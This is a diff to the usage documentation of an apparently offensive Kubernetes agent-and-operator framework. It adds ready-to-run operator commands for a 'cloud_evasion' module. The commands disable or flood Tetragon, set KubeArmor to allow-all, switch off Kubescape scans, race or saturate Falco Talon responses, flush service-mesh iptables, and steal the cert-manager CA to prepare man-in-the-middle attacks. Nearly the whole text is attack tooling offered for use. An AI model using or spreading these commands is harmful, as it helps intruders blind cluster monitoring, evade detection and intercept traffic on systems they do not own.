@@ -1829,7 +1829,7 @@ Agents include a built-in module system for executing specialized techniques wit
 | `cloud_exploit` | linux, windows, darwin | Cloud provider exploitation (AWS, GCP, Azure IAM/metadata attacks) |
 | `cicd_poison` | linux, windows, darwin | CI/CD pipeline poisoning (Tekton, ArgoCD, Flux task/app injection) |
 | `service_mesh` | linux, windows, darwin | Service mesh deep attacks (Istio xDS injection, mTLS cert theft, traffic hijack) |
-| `cloud_evasion` | linux, windows, darwin | Detection evasion (Falco bypass, admission controller evasion, runtime hiding) |
+| `cloud_evasion` | linux, windows, darwin | Detection evasion (Falco, Tetragon, KubeArmor, Kubescape, Falco Talon, service mesh, cert-manager) |
 
 **Module usage via operator:**
 
@@ -1893,6 +1893,42 @@ Agents include a built-in module system for executing specialized techniques wit
 ./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=falco technique=symlink
 ./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=admission technique=bypass_labels
 ./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=runtime technique=fileless
+
+# Tetragon evasion (io_uring bypass, policy gap analysis, ringbuf flood)
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=tetragon technique=io_uring
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=tetragon technique=policy_gaps
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=tetragon technique=ringbuf_flood
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=tetragon technique=disable_policy
+
+# KubeArmor evasion (LSM policy audit, unconfined detection, policy manipulation)
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kubearmor technique=policy_audit
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kubearmor technique=unconfined
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kubearmor technique=process_inject
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kubearmor technique=allow_all
+
+# Kubescape evasion (scan timing, label exclusion, disable scans)
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kubescape technique=scan_timing
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kubescape technique=label_exclusion
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kubescape technique=disable_scans
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=kubescape technique=config_modify
+
+# Falco Talon evasion (decoy, rule modification, saturation, response race)
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=talon technique=decoy
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=talon technique=rule_modify
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=talon technique=saturate
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=talon technique=response_race
+
+# Service mesh security evasion (host network bypass, init race, iptables flush)
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=mesh_security technique=host_network
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=mesh_security technique=init_race
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=mesh_security technique=iptables_bypass
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=mesh_security technique=disable_injection
+
+# cert-manager exploitation (enumerate, issue certs, steal CA, MITM prep)
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=certmanager technique=enumerate
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=certmanager technique=issue_cert
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=certmanager technique=steal_ca
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=certmanager technique=mitm_prep
 ```
 
 ---
